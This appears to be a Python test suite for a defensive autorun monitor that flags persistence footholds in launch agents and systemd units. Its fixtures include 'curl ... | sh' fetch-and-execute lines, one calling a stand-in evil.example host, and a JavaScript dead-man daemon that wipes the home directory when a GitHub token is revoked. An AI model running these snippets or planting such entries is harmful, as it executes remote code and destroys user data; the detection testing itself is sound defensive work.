#!/usr/bin/env python3
"""Autorun-surface monitor (#1333): catch a NOVEL foothold in a KNOWN location by fusing novelty +
provenance + content-shape + correlation — no signature required. Also locks the load-bearing safety
property: the baseline is NEVER trusted for safety (a tampered/absent baseline can't launder a
foothold), grading is deterministic at any -j, and non-regular files are never opened."""
from __future__ import annotations

import os
import plistlib
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from stayawake.bots.security.hygiene import mechanism, models
from stayawake.bots.security.hygiene.autorun import surface, provenance, grade, baseline, check_autorun

_ATTR = "stayawake.bots.security.hygiene.autorun.provenance"


def _agent(**plist) -> bytes:
    return plistlib.dumps(plist)


class _Surface(unittest.TestCase):
    def setUp(self):
        # Under HOME, because that is where real persistence dirs live (`~/Library/LaunchAgents`,
        # `~/.config/systemd/user`). The default tempdir is `/tmp` on Linux and `/var/folders/…` on
        # macOS, so a fixture placed there is a world-writable scratch path on one platform and not
        # the other — which silently made every payload-location assertion below mean two different
        # things depending on where the suite ran. Asserted, not assumed, so it fails loudly rather
        # than inverting again.
        home = Path(tempfile.mkdtemp(prefix="autorun-", dir=Path.home()))
        self.assertFalse(mechanism._under_scratch(home),
                         "fixture must not sit in a scratch dir — see the note above")
        self.d = home / "entries"
        self.d.mkdir()
        self.addCleanup(lambda: __import__("shutil").rmtree(home, ignore_errors=True))
        self.state = home / "state"
        self.state.mkdir()
        # isolate the baseline file + force a non-CI (workstation) env so novelty is exercised
        self.env = mock.patch.dict(os.environ, {
            "SAW_AUTORUN_BASELINE": str(self.state / "baseline.json"), "CI": ""})
        self.env.start()
        self.addCleanup(self.env.stop)
        self.dirs = mock.patch(
            "stayawake.bots.security.hygiene.os_service.user_persistence_dirs", return_value=[self.d])
        self.dirs.start()
        self.addCleanup(self.dirs.stop)

    def write(self, name: str, **plist):
        (self.d / name).write_bytes(_agent(**plist))

    def ids(self, issues):
        return {i.id for i in issues}


class TestSurfaceParse(_Surface):
    def test_parses_launch_agent_exec_and_persistence(self):
        self.write("x.plist", ProgramArguments=["/tmp/p", "-q"], RunAtLoad=True, StartInterval=60)
        (e,) = surface.enumerate_entries()
        self.assertEqual(e.exec_path, "/tmp/p")
        self.assertIn("run-at-load", e.persistence)
        self.assertIn("poll-interval=60s", e.persistence)

    def test_parses_systemd_execstart(self):
        (self.d / "w.service").write_text("[Service]\nExecStart=-/usr/bin/foo --bar\n[Install]\nWantedBy=default.target\n")
        (e,) = surface.enumerate_entries()
        self.assertEqual(e.exec_path, "/usr/bin/foo")     # leading `-` modifier stripped
        self.assertIn("enabled", e.persistence)

    def test_non_regular_file_is_never_opened(self):
        if not hasattr(os, "mkfifo"):
            self.skipTest("no mkfifo")
        os.mkfifo(self.d / "evil.plist")                  # a FIFO named like a plist would hang open()
        self.assertEqual(surface.enumerate_entries(), [])  # skipped via pathsafe, returns quickly


class TestProvenance(unittest.TestCase):
    def test_path_classification(self):
        self.assertEqual(provenance._classify_path("/usr/bin/x"), "trusted")
        self.assertEqual(provenance._classify_path("/Applications/Z.app/Contents/MacOS/z"), "trusted")
        self.assertEqual(provenance._classify_path("/tmp/x"), "untrusted")
        self.assertEqual(provenance._classify_path("~/.cache/x"), "untrusted")
        self.assertEqual(provenance._classify_path("/home/u/bin/x"), "unknown")

    def test_fail_closed_to_unattributed_on_subprocess_error(self):
        e = surface.AutorunEntry(location="l", path=Path("/x"), argv=["/home/u/bin/tool"])
        with mock.patch(f"{_ATTR}._run", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            a = provenance.attribute(e)
        self.assertFalse(a.attributed)                    # unknown owner + unknown sign → NOT blessed

    def test_owner_or_trusted_signed_is_attributed(self):
        self.assertTrue(provenance.Attribution("trusted", owner="coreutils").attributed)
        self.assertTrue(provenance.Attribution("trusted", signed=True).attributed)
        self.assertFalse(provenance.Attribution("trusted", signed=False).attributed)  # unsigned → not
        self.assertFalse(provenance.Attribution("untrusted").attributed)


class TestFusionGrading(_Surface):
    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_attributed_benign_is_clean(self):
        self.write("ok.plist", ProgramArguments=["/usr/bin/true"], RunAtLoad=True)
        self.assertEqual(self._run(signed=True), [])       # trusted + signed + no bad shape → clean

    def test_fetch_exec_is_a_foothold_even_if_signed(self):
        self.write("bad.plist", ProgramArguments=["/usr/bin/curl", "http://x", "|", "sh"], RunAtLoad=True)
        issues = self._run(signed=True)
        self.assertIn(models.HygieneIssue, {type(i) for i in issues})
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))

    def test_untrusted_path_with_persistence_is_a_foothold(self):
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_referenced_script_payload_is_caught(self):
        # the payload lives in the referenced SCRIPT, not the unit file — the monitor reads it (for an
        # unattributed entry) and catches the dropper without a signature for it.
        script = self.d / "run.sh"
        script.write_text("#!/bin/sh\ncurl http://evil.example/x | sh\n")
        self.write("s.plist", ProgramArguments=[str(script)], RunAtLoad=False)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_foothold_drives_rotation_unsafe_and_exit3(self):
        # a strong autorun finding is an ACTIVE_PERSISTENCE id → rotation UNSAFE (→ audit exit 3, #1332)
        self.assertIn("autorun-unattributed-foothold", models.ACTIVE_PERSISTENCE_IDS)
        self.write("t.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        ids = self.ids(self._run(signed=None))
        self.assertTrue(ids & models.ROTATION_UNSAFE_IDS)


# The Mini Shai-Hulud dead-man daemon: polls a LEGITIMATE endpoint (api.github.com every 60s) and wipes
# $HOME when the token is revoked. Plain code — NOT a decode→exec dropper — so it is caught by FUSING the
# destructive detector (#1334) into the autorun grading, and NEVER by a destination blocklist.
_DEADMAN = ("const os=require('os'),fs=require('fs');\n"
            "setInterval(async()=>{\n"
            "  const r=await fetch('https://api.github.com/user',{headers:{authorization:tok}});\n"
            "  if(r.status===401) fs.rmSync(os.homedir(),{recursive:true,force:true});\n"
            "},60000);\n")
# A benign timer daemon: same legitimate endpoint, same 60s cadence, same non-interactive origin — but
# no destructive behaviour. The behavioural features it SHARES with the wiper must not flag it.
_BENIGN_TIMER = ("const https=require('https');\n"
                 "setInterval(()=>{ https.get('https://api.github.com/repos/x/y/releases/latest'); },60000);\n")


class TestDeadmanDaemon(_Surface):
    """#1335 — a malicious daemon polling a legitimate endpoint can't be caught by WHERE it connects.
    The discriminating features are behavioural and, for a script-based daemon, STATIC: the poll cadence
    is a literal in the artifact, and a persistence entry is non-interactive by construction. Detection
    fuses the dead-man self-destruct (#1334) with the autorun context — no destination blocklist."""

    def _run(self, **patches):
        with mock.patch(f"{_ATTR}._package_owner", return_value=patches.get("owner")), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=patches.get("signed")):
            return check_autorun()

    def test_deadman_direct_script_is_a_foothold(self):
        (self.d / "gh-token-monitor.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=[str(self.d / "gh-token-monitor.js")],
                   RunAtLoad=True, StartInterval=60)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=None)))

    def test_deadman_laundered_through_trusted_interpreter_is_a_foothold(self):
        # `node /path/daemon.js`: argv[0] is the TRUSTED interpreter (signed → attributed), but node's
        # trust does not vouch for the script it runs — the daemon's code is still read and flagged.
        (self.d / "daemon.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=["/usr/bin/node", str(self.d / "daemon.js")],
                   RunAtLoad=True, StartInterval=60)
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run(signed=True)))  # node attributed

    def test_deadman_reason_names_the_behaviour_not_the_endpoint(self):
        (self.d / "d.js").write_text(_DEADMAN)
        self.write("m.plist", ProgramArguments=[str(self.d / "d.js")], RunAtLoad=True, StartInterval=60)
        (entry,) = surface.enumerate_entries()
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertTrue(sig.hit)
        self.assertTrue(any("self-destruct" in r for r in sig.reasons))      # the dead-man shape
        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))  # static cadence
        self.assertFalse(any("github" in r.lower() for r in sig.reasons))    # NOT keyed on the endpoint

    def test_benign_timer_daemon_is_not_decisive(self):
        # FP guard: a benign daemon sharing every behavioural feature the wiper has EXCEPT the
        # destructive payload — polls the same endpoint on the same cadence, non-interactive — must NOT
        # produce a decisive content hit. (Periodicity + non-interactive alone are never malicious.)
        (self.d / "updater.js").write_text(_BENIGN_TIMER)
        self.write("u.plist", ProgramArguments=["/usr/bin/node", str(self.d / "updater.js")],
                   StartInterval=60)
        (entry,) = surface.enumerate_entries()
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertFalse(sig.hit)                                            # not decisive
        self.assertFalse(any("self-destruct" in r for r in sig.reasons))    # no dead-man reason
        # a signed, attributed interpreter running this benign polling script is CLEAN end-to-end
        self.assertEqual(self._run(signed=True), [])

    def test_the_same_benign_script_IS_decisive_from_a_scratch_dir(self):
        # The paired positive, so the two properties cannot drift into each other. Behaviour alone
        # (poll + non-interactive) is never decisive; LOCATION is, on its own — no legitimate daemon
        # installs itself into a world-writable scratch dir. Same script as the test above, so the
        # only variable is where it lives.
        scratch = Path("/tmp/autorun-scratch-fixture")
        scratch.mkdir(parents=True, exist_ok=True)
        self.addCleanup(lambda: __import__("shutil").rmtree(scratch, ignore_errors=True))
        (scratch / "updater.js").write_text(_BENIGN_TIMER)
        self.write("u.plist", ProgramArguments=["/usr/bin/node", str(scratch / "updater.js")],
                   StartInterval=60)
        (entry,) = surface.enumerate_entries()
        sig = grade.content_signal(entry, read_referenced=True)
        self.assertTrue(sig.hit)
        self.assertIn("scratch", " ".join(sig.reasons))

    def test_inline_eval_payload_is_scanned_not_chased_as_a_path(self):
        # `node -e '<code>'`: the payload is inline in argv (seen via shape_text), not a file. The
        # dead-man shape is still caught, and _payload_path does NOT mistake the code for a phantom path.
        inline = "const os=require('os'),fs=require('fs');fs.rmSync(os.homedir(),{recursive:true});"
        entry = surface.AutorunEntry(location="launch-agent", path=Path("/x.plist"),
                                     argv=["/usr/bin/node", "-e", inline], body="")
        self.assertIsNone(grade._payload_path(entry))   # no path at all: inline code runs no file
        self.assertFalse(grade.launched_via_interpreter(entry))
        self.assertTrue(grade.content_signal(entry).hit)               # still caught via shape_text

    def test_short_poll_interval_read_from_systemd_timer(self):
        (self.d / "d.js").write_text(_DEADMAN)
        (self.d / "w.service").write_text(
            f"[Service]\nExecStart=/usr/bin/node {self.d / 'd.js'}\n"
            "[Timer]\nOnUnitActiveSec=60\n[Install]\nWantedBy=default.target\n")
        # find the .service entry and confirm the systemd cadence is parsed as a short poll interval
        entries = surface.enumerate_entries()
        svc = next(e for e in entries if e.path.name == "w.service")
        sig = grade.content_signal(svc, read_referenced=True)
        self.assertTrue(any("short poll interval (60s)" in r for r in sig.reasons))


class TestNoveltyReview(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_new_unattributed_nonstrong_is_review_only_after_baseline(self):
        # an unattributed entry on an 'unknown' path with no bad shape: first run captures baseline and
        # stays quiet on the review tier; a NEW one on a later run is an info review item.
        self.write("a.plist", ProgramArguments=["/home/u/bin/mytool"], RunAtLoad=False)
        first = self._run()
        self.assertNotIn("autorun-new-unattributed", self.ids(first))   # first run: no novelty nag
        self.write("b.plist", ProgramArguments=["/home/u/bin/other"], RunAtLoad=False)
        second = self._run()
        review = [i for i in second if i.id == "autorun-new-unattributed"]
        self.assertEqual(len(review), 1)                               # the NEW entry only
        self.assertEqual(review[0].severity, "info")


class TestBaselineNotLoadBearing(_Surface):
    def _run(self):
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            return check_autorun()

    def test_foothold_caught_even_when_baseline_marks_it_known(self):
        # THE load-bearing property: launder the foothold into the baseline as 'known'; it must STILL
        # be caught (provenance + shape run regardless of the baseline).
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()                                        # capture a baseline that now knows evil.plist
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))

    def test_tampered_baseline_is_detected_and_ignored(self):
        self.write("evil.plist", ProgramArguments=["/tmp/agent"], RunAtLoad=True)
        self._run()
        p = baseline.baseline_path()                       # hand-edit entries without fixing self_hash
        import json
        data = json.loads(p.read_text()); data["entries"]["/laundered"] = "x"; p.write_text(json.dumps(data))
        b = baseline.load_baseline()
        self.assertEqual(b.status, "tampered")
        self.assertFalse(b.trusted)                        # → novelty ignored, foothold still graded
        self.assertIn("autorun-unattributed-foothold", self.ids(self._run()))


class TestCorrelation(_Surface):
    def test_shared_unattributed_payload_across_entries(self):
        # two agents wired to the SAME unattributed payload — the campaign shape.
        self.write("a.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        self.write("b.plist", ProgramArguments=["/home/u/.local/x"], RunAtLoad=False)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            issues = check_autorun()
        self.assertIn("autorun-unattributed-foothold", self.ids(issues))   # correlated → strong


class TestDeterminism(_Surface):
    def test_grading_identical_at_any_worker_count(self):
        for i in range(6):
            self.write(f"a{i}.plist", ProgramArguments=[f"/tmp/x{i}"], RunAtLoad=True)
        with mock.patch(f"{_ATTR}._package_owner", return_value=None), \
             mock.patch(f"{_ATTR}._homebrew_owner", return_value=None), \
             mock.patch(f"{_ATTR}._codesigned", return_value=None):
            one = [(i.id, i.title) for i in check_autorun(jobs=1)]
            many = [(i.id, i.title) for i in check_autorun(jobs=8)]
        self.assertEqual(one, many)                        # submission-order → byte-identical findings


if __name__ == "__main__":
    unittest.main()
